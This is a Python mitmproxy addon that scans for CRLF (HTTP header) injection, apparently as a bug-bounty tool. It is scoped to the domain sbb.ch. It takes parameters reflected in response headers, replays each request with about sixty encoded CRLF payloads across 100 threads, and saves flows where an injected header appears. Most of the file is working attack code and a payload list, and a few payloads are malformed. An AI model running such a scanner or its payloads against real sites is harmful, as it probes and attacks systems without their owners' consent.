from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
import json
import re
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor

class crlfResponse:
    def __init__(self):
        self.scope = "sbb.ch"
        self.flow_dir_crlf = "crlf_flows"
        os.makedirs(self.flow_dir_crlf, exist_ok=True)
        self.hashes_file_path = os.path.join(self.flow_dir_crlf, "request_hashes.txt")
        self.processed_requests = self.load_processed_requests()
        self.alteration_indicators_crlf = [
    "%0AHeader-Test:BLATRUC",
    "%0A%20Header-Test:BLATRUC",
    "%20%0AHeader-Test:BLATRUC",
    "%23%OAHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "%3F%0AHeader-Test:BLATRUC",
    "crlf%0AHeader-Test:BLATRUC",
    "crlf%0A%20Header-Test:BLATRUC",
    "crlf%20%0AHeader-Test:BLATRUC",
    "crlf%23%OAHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "crlf%3F%0AHeader-Test:BLATRUC",
    "%0DHeader-Test:BLATRUC",
    "%0D%20Header-Test:BLATRUC",
    "%20%0DHeader-Test:BLATRUC",
    "%23%0DHeader-Test:BLATRUC",
    "%23%0AHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "%3F%0DHeader-Test:BLATRUC",
    "crlf%0DHeader-Test:BLATRUC",
    "crlf%0D%20Header-Test:BLATRUC",
    "crlf%20%0DHeader-Test:BLATRUC",
    "crlf%23%0DHeader-Test:BLATRUC",
    "crlf%23%0AHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "crlf%3F%0DHeader-Test:BLATRUC",
    "%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%20Header-Test:BLATRUC",
    "%20%0D%0AHeader-Test:BLATRUC",
    "%23%0D%0AHeader-Test:BLATRUC",
    "\\r\\nHeader-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "%5cr%5cnHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "%3F%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0A%20Header-Test:BLATRUC",
    "crlf%20%0D%0AHeader-Test:BLATRUC",
    "crlf%23%0D%0AHeader-Test:BLATRUC",
    "crlf\\r\\nHeader-Test:BLATRUC",
    "crlf%5cr%5cnHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "crlf%3F%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%09Header-Test:BLATRUC",
    "crlf%0D%0A%09Header-Test:BLATRUC",
    "%250AHeader-Test:BLATRUC",
    "%25250AHeader-Test:BLATRUC",
    "%%0A0AHeader-Test:BLATRUC",
    "%25%30AHeader-Test:BLATRUC",
    "%25%30%61Header-Test:BLATRUC",
    "%u000AHeader-Test:BLATRUC",
    "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC",
    "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC",
    "/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
]
        self.altered_header_crlf = "x-altered-crlf"
        self.params_string = ""

    def load_processed_requests(self):
        try:
            with open(self.hashes_file_path, 'r') as file:
                return set(line.strip() for line in file)
        except FileNotFoundError:
            return set()

    def save_processed_request(self, request_hash):
        with open(self.hashes_file_path, 'a') as file:
            file.write(f"{request_hash}\n")

    def request_hash(self, flow, params_string):
        method = flow.request.method
        parsed_url = urlparse(flow.request.url)
        url = parsed_url.path
        request_str = f"{method}{url}{params_string}{self.altered_header_crlf}"
        self.params_string = ""
        return hashlib.sha256(request_str.encode('utf-8')).hexdigest()

    def response(self, flow: http.HTTPFlow) -> None:
        parsed_url = urlparse(flow.request.url)
        if self.scope not in parsed_url.hostname:
            return        

         #--- first phase check the method request ---
        if self.altered_header_crlf in flow.request.headers:
            self.check_altered_reflection_crlf(flow)
            return


        if flow.request.method == "GET":
            method = flow.request.method

            self.process_parameters_crlf(flow, flow.request.query, method)
        elif flow.request.method == "POST":
            method = flow.request.method
            self.process_post_request_crlf(flow, method)

         #--- end first phase check the method request ---

    # ---- the porcess parameter called when is POST or GET
                
    def process_parameters_crlf(self, flow, params, method):
        content_type = flow.request.headers.get("Content-Type", "")
        if method == "POST":
            all_processed_items = self.if_content_is_json_dic(params)
            for key, content in all_processed_items.items():
                self.params_string += str(key)
            request_id = self.request_hash(flow, self.params_string)
            if request_id in self.processed_requests:
                ctx.log.info("Duplicate request detected, skipping...")
                return
            self.processed_requests.add(request_id)
            self.save_processed_request(request_id)

            for key, content in all_processed_items.items():
                if str(content) in f"{flow.response.headers}":
                    self.handle_reflection_crlf(flow, key)


        elif method == "GET":
            for param, value in params.items():
                self.params_string += str(param)
            
            request_id = self.request_hash(flow, self.params_string)
            if request_id in self.processed_requests:
                ctx.log.info("Duplicate request detected, skipping...")
                return
            self.processed_requests.add(request_id)
            self.save_processed_request(request_id)
            for param, value in params.items():
                try:
                    orginalgetparam = param
                    decoded_json = json.loads(unquote(value))
                    if isinstance(decoded_json, dict) or isinstance(decoded_json, list):
                        all_processed_items = self.if_content_is_json_dic(decoded_json)

                        for key, content in all_processed_items.items():
                            if str(content) in f"{flow.response.headers}":
                                self.handle_reflection_crlf(flow, key, decoded_json, orginalgetparam)
                except:
                    if str(value) in f"{flow.response.headers}":
                        self.handle_reflection_crlf(flow, param)


    # ---- -------------------end of the function------------------ ------- -----------

    # ---- porcess post request crlf ----------------------------------------

    def process_post_request_crlf(self, flow, method):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type or "text/plain" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            #params = self.normalize_query_params(params)
            self.process_parameters_crlf(flow, params, method)
        elif "json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):

                    self.process_parameters_crlf(flow, params, method)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    # ---- ------------------end function ----------------------------------------
#---- ---------------- if_content_is_json_dic -----------------------------
   
    def if_content_is_json_dic(self, params, parent_key=''):
        processed_items = {}
        if isinstance(params, dict):
            for key, value in params.items():
                compound_key = f"{parent_key}.{key}" if parent_key else key
                processed_items.update(self.if_content_is_json_dic(value, compound_key))
        elif isinstance(params, list):
            for index, item in enumerate(params):
                compound_key = f"{parent_key}[{index}]"
                processed_items.update(self.if_content_is_json_dic(item, compound_key))
        else:
            # Attempt to parse a JSON-encoded string into a dict or list
            if isinstance(params, str):
                try:
                    parsed_json = json.loads(params)
                    # Recursively process the parsed JSON
                    return self.if_content_is_json_dic(parsed_json, parent_key)
                except json.JSONDecodeError:
                    # Not a JSON string, treat as a base case
                    pass
            # Base case: param is neither a dict, list, nor JSON string
            processed_items[parent_key] = params
        return processed_items

#---- ---------------- end of function -----------------------------

#---- ----------handle reflection function -----------------------------

    def handle_reflection_crlf(self, flow, param, dictoniry=None, orginalgetparam=None):
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Logic to handle the reflection, e.g., logging, altering, and replaying
            for indicator in self.alteration_indicators_crlf:
                executor.submit(self.alter_and_replay_crlf, flow, param, indicator, dictoniry, orginalgetparam)


#---- ----------end of handle reflection function -----------------------------


#---- ---------- alter_and_replay_crlf function -----------------------------
    def alter_and_replay_crlf(self, original_flow, param, indicator, dictoniry, orginalgetparam):
        altered_value = indicator
        altered_flow = self.alter_request_crlf(original_flow, param, altered_value, dictoniry, orginalgetparam)
        if altered_flow:
            ctx.master.commands.call("replay.client", [altered_flow])
#---- ---------- end alter_and_replay_crlf function -----------------------------

#---- ---------- set_nested_value function -----------------------------

    def set_nested_value(self, dct, compound_key, value):
        keys = compound_key.split('.')
        for i, key in enumerate(keys):
            if '[' in key and ']' in key:  # Handle list indices within the key
                list_key, index_part = key.split('[')
                index = int(index_part[:-1])  # Remove the ']' and convert to int

                if i == 0:  # Special handling for the first key if it's a list
                    element = dct.get(list_key, [])[index]
                    if isinstance(element, str):  # Check if element is a JSON string
                        if i < len(keys) - 1:  # More keys to navigate
                            parsed_element = json.loads(element)
                            self.set_nested_value(parsed_element, '.'.join(keys[i+1:]), value)  # Recurse
                            dct[list_key][index] = json.dumps(parsed_element)  # Update with modified JSON
                            return
                        else:  # Last key, direct update
                            dct[list_key][index] = value
                            return
                    else:  # If not a string, normal list handling
                        if i < len(keys) - 1:  # Not the last key, so just navigate
                            dct = element
                        else:  # Last key, direct update
                            dct[list_key][index] = value
                            return
                else:  # For nested lists within the structure
                    if i < len(keys) - 1:  # Not the last key, navigate
                        dct = dct[list_key][index]
                    else:  # Last key, update directly
                        dct[list_key][index] = value
            else:  # Handle normal dictionary keys
                if i < len(keys) - 1:  # Not the last key, navigate or create dict
                    dct = dct.setdefault(key, {})
                else:  # Last key, update value
                    dct[key] = value

#---- ---------- end of set_nested_value function -----------------------------

#---- ---------- alter_request_crlf function -----------------------------

    def alter_request_crlf(self, original_flow, param, altered_value, dictoniry, orginalgetparam):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            if dictoniry:
                if isinstance(dictoniry, list):  # Ensure the dictionary is actually a list
                    try:
                        # Extract indices from the param string, e.g., "[1][3]" -> [1, 3]
                        indices = [int(index.strip('[]')) for index in param.split('][')]
                        body = json.loads(new_request.query[orginalgetparam])
                        target = body
                        # Navigate through the nested structure up to the last index
                        for index in indices[:-1]:
                            target = target[index]
                        # Use the last index to set the new value
                        last_index = indices[-1]
                        if 0 <= last_index < len(target):
                            target[last_index] = altered_value
                            new_request.query[orginalgetparam] = json.dumps(body)  # Update the query parameter
                        else:
                            print("Index out of range.")
                    except (ValueError, IndexError, TypeError) as e:
                        print(f"Error processing nested indices: {e}")
                else:
                    body = json.loads(new_request.query[orginalgetparam])
                    self.set_nested_value(body, param, altered_value)  # Use the utility function here
                    new_request.query[orginalgetparam] = json.dumps(body)
            else:
                new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type or "text/plain" in content_type:
                try:
                    params = urllib.parse.parse_qs(new_request.get_text())
                    self.set_nested_value(params, param, altered_value)
                    new_request.text = urllib.parse.urlencode(params, doseq=True)
                except json.JSONDecodeError:
                    params[orginalgetparam] = [altered_value]
                    new_request.text = urllib.parse.urlencode(params, doseq=True)
                    pass
                    
            elif "json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    self.set_nested_value(body, param, altered_value)  # Use the utility function here
                    new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass

        new_request.headers[self.altered_header_crlf] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

#---- ---------- end alter_request_crlf function -----------------------------

#---- ---------- check_altered_reflection_crlf function -----------------------------
    def check_altered_reflection_crlf(self, flow):
        # Checks if the CRLF payloads are reflected in the response headers.
        for header, value in flow.response.headers.items():
            if "header-test" in header:
                ctx.log.info(f"CRLF Injection Detected: {flow.request.url}")
                self.save_flow_crlf(flow)
        

    def save_flow_crlf(self, flow):
        filename = os.path.join(self.flow_dir_crlf, f"{flow.request.method}_captured_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved crlf flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")
#---- ---------- end save_flow_crlf function -----------------------------
addons = [crlfResponse()]
